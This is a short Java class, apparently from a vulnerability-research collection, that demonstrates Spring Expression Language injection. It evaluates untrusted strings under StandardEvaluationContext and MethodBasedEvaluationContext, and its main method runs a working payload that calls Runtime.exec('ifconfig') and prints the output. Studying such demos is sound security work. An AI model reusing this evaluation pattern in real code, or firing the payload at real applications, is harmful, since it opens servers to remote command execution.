package com.ppp.vulns.core.vulns.expression;

import org.springframework.context.expression.MethodBasedEvaluationContext;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
/**
 * @author Whoopsunix
 */
public class SPEL {

    public static void main(String[] args) {
        String runtimeEcho = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter(\"\\\\A\").next()";
        Object obj = spelMethodBasedEvaluationContext(runtimeEcho);
        System.out.println(obj);
    }

    public static Object spel(String payload) {
        return new SpelExpressionParser().parseExpression(payload).getValue();
    }

    /**
     * 默认也是用的 StandardEvaluationContext
     */
    public static Object spelStandardEvaluationContext(String payload) {
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    public static Object spelMethodBasedEvaluationContext(String payload) {
        EvaluationContext evaluationContext = new MethodBasedEvaluationContext(null, null, null, null);
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }
}
